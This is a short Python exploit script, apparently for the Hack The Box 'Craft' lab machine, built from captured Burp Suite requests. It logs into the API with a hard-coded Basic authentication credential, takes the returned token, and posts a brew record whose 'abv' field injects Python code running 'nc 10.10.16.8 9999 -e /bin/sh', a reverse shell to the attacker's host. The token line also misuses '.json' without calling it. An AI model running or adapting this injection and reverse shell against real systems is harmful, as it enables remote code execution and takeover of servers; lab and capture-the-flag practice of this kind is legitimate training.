import requests

session = requests.session()

burp0_url = "https://api.craft.htb:443/api/auth/login"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Authorization": "Basic ZGluZXNoOjRhVWgwQThQYlZKeGdk", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://craft.htb/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-site", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers", "Connection": "keep-alive"}
token = session.get(burp0_url, headers=burp0_headers).json['message']


burp0_url = "https://api.craft.htb:443/api/brew/"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Content-Type": "application/json", "Accept-Language": "en-US,en;q=0.5", "X-Craft-Api-Token": token, "Accept-Encoding": "gzip, deflate, br", "Referer": "https://craft.htb/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-site", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers", "Connection": "keep-alive"}
burp0_json={"abv": "__import__('os').system('nc 10.10.16.8 9999 -e /bin/sh')", "brewer": "string", "id": 0, "name": "string", "style": "string"}
session.post(burp0_url, headers=burp0_headers, json=burp0_json)